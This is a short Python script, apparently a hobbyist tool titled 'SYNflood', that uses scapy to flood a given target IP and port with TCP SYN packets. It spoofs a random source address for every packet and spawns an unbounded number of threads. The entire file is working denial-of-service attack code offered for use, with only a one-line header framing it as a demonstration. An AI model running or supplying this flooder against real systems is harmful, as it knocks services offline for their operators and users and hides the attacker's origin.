#!/usr/bin/env python
#########################################
# 
# SYNflood - A multithreaded SYN Flooder
# By James Penguin
#
# This script is a demonstration of a SYN/ACK 3 Way Handshake Attack 
# as discussed in this article by Halla:
# http://informationleak.net/Hacking/Beginner/synack_3_way_handshake_exploit_explained_halla.htm
#
#########################################
import socket, random, sys, threading
from scapy.all import *

if len(sys.argv) != 4:
	print "Usage: %s <Interface> <Target IP> <Port>" % sys.argv[0]
	sys.exit(1)

interface = sys.argv[1]
target = sys.argv[2]
port = int(sys.argv[3])

thread_limit = 200000
total = 0
#scapy.conf.iface = interface
conf.iface='en1';#network card XD

class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		#s = socket.socket()
		#s.connect((target,port))
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'

		send(i/t, verbose=0)

print "Flooding %s:%i with SYN packets." % (target, port)
while 1:
	#if threading.activeCount() < thread_limit: 
	sendSYN().start()
	total += 1
	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
